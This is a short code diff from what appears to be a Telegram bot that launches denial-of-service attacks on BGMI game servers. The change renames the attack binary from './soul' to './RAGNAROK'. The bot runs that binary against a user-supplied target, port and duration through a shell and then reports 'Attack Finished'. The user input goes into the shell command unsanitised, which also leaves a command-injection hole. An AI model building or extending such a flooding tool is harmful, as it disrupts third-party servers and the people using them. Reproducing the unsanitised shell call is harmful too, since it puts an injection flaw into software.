@@ -311,7 +311,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/RAGNAROK', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./soul {target} {port} {time}"
+                full_command = f"./RAGNAROK {target} {port} {time}"
                 process = subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
